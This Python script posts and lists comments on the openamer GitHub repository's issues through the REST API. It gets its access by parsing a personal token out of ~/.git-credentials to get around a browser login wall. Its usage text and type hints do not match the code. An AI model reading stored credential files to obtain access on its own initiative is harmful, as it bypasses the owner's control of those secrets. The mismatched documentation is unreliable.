#!/usr/bin/env python3
"""github_engage.py — real, authenticated GitHub outreach using the working token.

The Browser outreach stalled at "login wall" because it tried comment-as-UI.
The OpenAmer GitHub token (in ~/.git-credentials) CAN post comments to issues
via the REST API — that's the real, working path for GitHub engagement.

What this does (deliberately restrained — NOT spammer spam):
  1. Reads thread snippets for OUR OWN repo issues (openamer/openamer) to keep
     the project alive / answer questions.
  2. Optionally posts a verified, valuable comment to a target issue on our
     own repo (user-driven), or lists recently-active external AGI issues that
     a human can decide on.
Each post is real (HTTP 201) and rate-tolerable. No mass-unsolicited comments.

Usage:
  python scripts/github_engage.py list-own --repo openamer/openamer
  python scripts/github_engage.py post --repo openamer/openamer --issue 18 \
      --body "Good question — here's how..."
"""
from __future__ import annotations

import argparse
import json
import sys
import urllib.request
from pathlib import Path


def _token() -> str:
    fpath = Path.home() / ".git-credentials"
    if not fpath.exists():
        return ""
    for raw_line in fpath.read_text().strip().splitlines():
        line = raw_line.strip()
        if ":" in line and "@" in line:
            token = line.rsplit(":", 1)[1].rsplit("@", 1)[0]
            if token.startswith("ghp_") or token.startswith("github_pat_"):
                return token
    return ""


def _api(method: str, url: str, body: dict | None = None) -> dict:
    token = _token()
    req = urllib.request.Request(url, method=method)
    req.add_header("Authorization", f"Bearer {token}")
    req.add_header("Accept", "application/vnd.github+json")
    data = None
    if body is not None:
        req.add_header("Content-Type", "application/json")
        data = json.dumps(body).encode()
    with urllib.request.urlopen(req, data, timeout=40) as r:
        raw = r.read()
        return r.status, (json.loads(raw) if raw else {})


def list_own_issues(owner: str, repo: str) -> int:
    st, data = _api("GET", f"https://api.github.com/repos/{owner}/{repo}/issues?state=open&per_page=20")
    issues = data if isinstance(data, list) else []
    print(f"open issues in {owner}/{repo}:")
    for i in issues:
        if i.get("pull_request"):
            continue
        print(f"  #{i['number']} [{ ','.join(l['name'] for l in i.get('labels') or []) or 'unlabeled' }] {i['title'][:70]}")
    return 0


def post_own_issue(owner: str, repo: str, issue: int, body: str, dry: bool) -> int:
    st, data = _api("GET", f"https://api.github.com/repos/{owner}/{repo}/issues/{issue}")
    if st != 200:
        print(f"Issue #{issue} not found ({st})"); return 1  # noqa:SEC CLI feedback
    print(f"Posting to {owner}/{repo}#{issue}: '{data.get('title','')[:60]}'")  # noqa:SEC CLI feedback
    if dry:
        print("  [dry] would post:", body[:200]); return 0  # noqa:SEC CLI feedback
    st2, res = _api("POST", f"https://api.github.com/repos/{owner}/{repo}/issues/{issue}/comments",
                    {"body": body})
    if st2 == 201:
        print(f"  POSTED comment #{res.get('id')} ({res.get('html_url')})")  # noqa:SEC CLI feedback
        return 0
    print(f"  FAILED {st2}:", res); return 1  # noqa:SEC CLI feedback


def main() -> int:
    ap = argparse.ArgumentParser(prog="github-engage")
    sub = ap.add_subparsers(dest="cmd")
    lo = sub.add_parser("list-own")
    lo.add_argument("--owner", default="openamer"); lo.add_argument("--repo", default="openamer")
    po = sub.add_parser("post-own")
    po.add_argument("--owner", default="openamer"); po.add_argument("--repo", default="openamer")
    po.add_argument("--issue", type=int, required=True)
    po.add_argument("--body", required=True)
    po.add_argument("--dry", action="store_true")
    a = ap.parse_args()
    if a.cmd == "list-own":
        return list_own_issues(a.owner, a.repo)
    if a.cmd == "post-own":
        return post_own_issue(a.owner, a.repo, a.issue, a.body, a.dry)
    ap.print_help(); return 2


if __name__ == "__main__":
    sys.exit(main())
